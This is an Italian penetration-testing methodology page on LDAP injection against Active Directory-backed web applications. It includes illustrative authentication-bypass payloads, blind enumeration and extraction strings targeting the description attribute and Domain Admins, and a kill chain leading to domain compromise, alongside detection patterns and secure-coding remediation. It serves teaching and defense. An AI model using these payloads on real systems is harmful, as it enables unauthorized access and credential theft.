> [English](README.en.md) | **Italiano**

# LDAP Injection

> - **Fase:** Web Exploitation - OWASP A03:2021 Injection (filtro LDAP costruito con input non sanitizzato)
> - **Visibilita:** Media - query LDAP anomale verso il directory server; l'enumerazione con wildcard genera un volume insolito di bind/ricerche
> - **Prerequisiti:** un'applicazione che costruisce un filtro LDAP concatenando input dell'utente (login portale, ricerca utenti, directory lookup) verso un backend LDAP/Active Directory
> - **Natura del documento:** metodologia. Payload illustrativi (forma didattica OWASP), nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: manipolare la logica di un filtro LDAP per ottenere bypass dell'autenticazione, enumerazione degli utenti della directory ed estrazione di attributi sensibili, con impatto diretto su Active Directory.

---

## Executive Summary

La LDAP Injection e l'equivalente della SQL Injection applicato ai filtri LDAP. Moltissime applicazioni
enterprise (portali webmail, VPN, intranet, helpdesk) verificano le credenziali con una query LDAP verso un
Domain Controller. Se il filtro e costruito concatenando l'input dell'utente senza sanitizzazione, un
attaccante puo iniettare i metacaratteri della sintassi LDAP (`&`, `|`, `!`, `*`, parentesi) e alterare il
significato della query.

La differenza rispetto alla SQLi e il bersaglio: qui non si attacca un database applicativo ma la **directory
aziendale** (Active Directory, OpenLDAP, FreeIPA), cioe il sistema che governa utenti, gruppi e policy
dell'intera organizzazione. Gli impatti principali sono tre: **bypass dell'autenticazione** (login senza
password), **enumerazione completa degli utenti** e **estrazione di attributi sensibili** (telefono, email,
gruppi e, non di rado, password lasciate in chiaro nel campo `description`). La severity tipica e `Alto` e sale
a `Critico` quando porta a un account privilegiato.

## Contesto operativo (perche, prima del come)

La LDAP Injection si cerca su ogni funzionalita che interroga la directory: form di login, ricerca utenti,
rubrica, lookup. Il test iniziale e minimo e non distruttivo: si verifica se un carattere speciale (la wildcard)
cambia il comportamento dell'applicazione. La decisione operativa successiva dipende dal feedback: se l'app
mostra messaggi diversi per "utente inesistente" e "password errata", si puo enumerare; se riflette il
contenuto, si estrae; altrimenti si procede in modalita blind, carattere per carattere, come nella
[SQLi blind](<../sql-injection (SQLi)/README.md>).

## Esecuzione / Comandi

### Fase 1 - Conferma della vulnerabilita (test non distruttivo)

Un filtro di autenticazione tipico ha questa forma (notazione prefissa, con AND tra le due condizioni):

```
(&(uid=NOME_UTENTE)(userPassword=PASSWORD))
```

Il test consiste nell'inviare la wildcard `*` come nome utente e osservare se la risposta cambia (es. un errore
diverso, o "utenti multipli trovati"). Un cambiamento indica che l'input raggiunge il filtro senza escape.

### Fase 2 - Bypass dell'autenticazione

Si iniettano metacaratteri che chiudono prematuramente il filtro e introducono una condizione sempre vera,
rendendo irrilevante la password. Payload nel campo username (password qualsiasi):

```
*                       <-- wildcard: matcha tutti gli utenti, autentica il primo (spesso admin)
admin)(&)               <-- chiusura + (&) sempre-vero
admin))(|(uid=*         <-- OR injection: forza la clausola a TRUE
*)(uid=*))(|(uid=*      <-- variante OR con wildcard
```

Esempio di come `admin)(&)` altera il filtro vulnerabile `(&(uid=INPUT)(userPassword=PASS))`:

```
(&(uid=admin)(&))(userPassword=PASS))
         ^^^^  la sotto-clausola (&) e sempre vera; la password non viene piu valutata
```

### Fase 3 - Enumerazione ed estrazione (blind)

Se l'applicazione risponde in modo diverso a condizioni vere e false, si enumerano gli utenti per prefisso e si
estraggono gli attributi un carattere alla volta. L'attributo di maggior valore in AD e `description`, dove e
pratica (pessima ma diffusa) annotare password temporanee.

```
# Enumerazione utenti per prefisso (nel campo username)
a*     -> "password errata"     <-- esistono utenti che iniziano per 'a'
b*     -> "utente inesistente"  <-- nessun utente inizia per 'b'
adm*   -> "password errata"     <-- esiste 'admin' o simili

# Estrazione blind del campo description di 'admin', carattere per carattere
admin)(description=P*       -> TRUE   <-- la description inizia per 'P'
admin)(description=Pass*    -> TRUE
admin)(description=Password1*  -> TRUE ... fino alla stringa completa

# Enumerazione dei membri di un gruppo privilegiato (via ricerca)
*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local   <-- elenca i Domain Admin
```

Variante API/JSON (backend LDAP dietro un endpoint REST):

```
POST /api/v2/auth/login    {"username": "admin)(&)", "password": "x"}
POST /api/v2/users/search  {"query": "*)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local"}
```

## Analisi dei risultati

Un bypass dell'autenticazione riuscito apre l'accesso applicativo con l'identita di un altro utente (spesso il
primo in directory, tipicamente privilegiato). L'enumerazione fornisce la lista completa degli utenti AD;
l'estrazione del campo `description` puo restituire password in chiaro riutilizzabili. La severity reale va da
`Alto` (bypass + enumerazione) a `Critico` quando una credenziale estratta appartiene a un account ad alto
privilegio (es. un service account con diritti di dominio). Se l'applicazione fa escape dei metacaratteri o usa
binding parametrizzati, il vettore e chiuso (test di Fase 1 negativo).

### Analisi Teorica

La LDAP Injection e un caso del problema generale dell'injection [Su & Wassermann 2006]: confondere dati e
istruzioni. Il filtro LDAP e codice (una espressione logica); se l'input dell'utente vi viene concatenato come
stringa, l'utente puo inserire operatori che il motore LDAP interpreta come struttura, non come dato. La
contromisura e la stessa di tutta la famiglia injection: separare dati e codice. In LDAP significa fare escape
dei metacaratteri (`*`, `(`, `)`, `\`, NUL) o, meglio, usare API che parametrizzano il filtro (ldap3 in Python,
Spring LDAP in Java), in modo che l'input non possa mai alterare la sintassi.

## Remediation (Blue Team)

**Rilevamento (directory server / SIEM).**
- Query LDAP contenenti metacaratteri sospetti (`*`, `)(`, `|`, `!`) nei log del directory server.
- Volume anomalo di bind/ricerche dallo stesso IP in poco tempo (indice di enumerazione).
- Accessi sequenziali con nomi utente `a*`, `b*`, ... (pattern di enumerazione per prefisso).
- Bind riusciti a fronte di filtri malformati.

**Hardening (secure coding).**
- Fare escape dei metacaratteri LDAP nell'input (`*`, `(`, `)`, `\`, NUL, `/`) o usare funzioni di ricerca
  parametrizzate della libreria (la contromisura primaria).
- Whitelisting dell'input: per gli username, consentire solo caratteri alfanumerici e `._-`.
- Stesso messaggio di errore per "utente inesistente" e "password errata" (impedisce l'enumerazione).
- Non usare mai il campo `description` (o campi liberi) per annotare password.
- Disabilitare l'anonymous bind sul Domain Controller.

---

## Scenario Reale: Proiezione Post-Exploitation

> Vale per l'esito "bypass auth / estrazione credenziali" (severity Alto/Critico).

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** portale aziendale con autenticazione LDAP e input non sanitizzato (confermato in Fase 1).

**Passo successivo immediato:** bypass dell'autenticazione come primo utente in directory, poi enumerazione ed
estrazione degli attributi degli utenti chiave.

**Kill Chain proiettata:**

```
LDAP Injection su un portale con backend AD
        |
        v
Bypass autenticazione + enumerazione di tutti gli utenti di dominio
        |
        v
Estrazione del campo description -> password in chiaro di service account
        |
        v
Password spray / riuso -> account privilegiato -> DCSync (dominio compromesso)
```

**Impatto potenziale:** da una vulnerabilita applicativa al controllo del dominio, quando le credenziali estratte
aprono un account ad alto privilegio. Il collegamento naturale e con il modulo
[11-active-directory](<../../../11-active-directory (Windows Domain)/README.md>).

**Vettori di monetizzazione tipici:** accesso a dati sensibili aziendali; compromissione del dominio; rivendita
di accessi.

### Prospettiva Difensore (Blue Team)

**Rilevamento:** metacaratteri LDAP nei log del directory server; picchi di bind/ricerche; enumerazione per
prefisso.

**Indicatori di Compromissione (IOC):**
- Filtri LDAP con `*`, `)(`, `|`, `!` non generati dall'applicazione.
- Numero anomalo di bind dallo stesso client in breve tempo.
- Accessi con username sequenziali `a*`, `b*`, ...

**Contenimento:** blocco del pattern via WAF; rotazione delle credenziali potenzialmente estratte (specie i
service account); indagine sugli accessi.

**Eradicazione e hardening:** escape/parametrizzazione dei filtri; messaggi di errore uniformi; rimozione delle
password dai campi liberi; disabilitazione dell'anonymous bind.

**Lezione difensiva:** la LDAP Injection mostra come un difetto applicativo apparentemente "web" sfoci
direttamente nel cuore dell'identita aziendale. La difesa e secure coding (separare dati e codice nel filtro),
non un controllo a valle.

---

## Tool di riferimento

| Tool | Tipo | Tecnica/Accesso | Caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | Proxy/scanner | Web - Attivo | Intercetta e modifica i parametri inviati al filtro LDAP; fuzzing dei metacaratteri |
| `ldapsearch` | LDAP client | CLI - Attivo | Verifica diretta del comportamento del directory server e degli attributi |
| `python-ldap3` | Libreria Python | Secure coding | Binding/ricerche parametrizzate per la remediation (Blue Team) |
| `ffuf` / `wfuzz` | Web fuzzer | CLI - Attivo | Automazione dell'enumerazione per prefisso via risposte differenziali |

## Note di metodologia

In lab reale (es. un'app con login LDAP o un target didattico) i dati da documentare come finding: la conferma
del test wildcard, l'esito del bypass, la lista enumerata e gli eventuali attributi estratti. Le credenziali
reali eventualmente estratte vanno trattate come dati sensibili e redatte nel report. I payload mostrati sono
nella forma didattica minima, non una catena operativa completa.

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Initial Access | Exploit Public-Facing Application | `T1190` | Sfruttamento del filtro LDAP non sanitizzato su un'applicazione esposta. |
| Discovery | Account Discovery: Domain Account | `T1087.002` | Enumerazione degli utenti di dominio tramite wildcard/condizioni differenziali. |
| Collection | Data from Information Repositories | `T1213` | Estrazione di attributi sensibili (incluse password nel campo description) dalla directory. |

---

## Correlazioni con altri finding

| Provenienza | Questa tecnica | Effetto |
| :--- | :--- | :--- |
| [02-web-recon](<../../02-web-recon (Enumeration)/README.md>) | LDAP Injection | l'enumerazione individua i portali con autenticazione LDAP/AD |
| LDAP Injection (credenziali estratte) | [11-active-directory](<../../../11-active-directory (Windows Domain)/README.md>) | le credenziali aprono la fase di attacco al dominio (fino a DCSync) |
| LDAP Injection | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.md>) | la remediation (filtri parametrizzati) si collega al laboratorio di secure coding |

---

> **Nota:** Contenuto didattico e di metodologia. Le tecniche vanno eseguite esclusivamente su applicazioni di proprieta o con autorizzazione esplicita. I payload sono illustrativi e non provengono da sistemi reali o di terze parti.
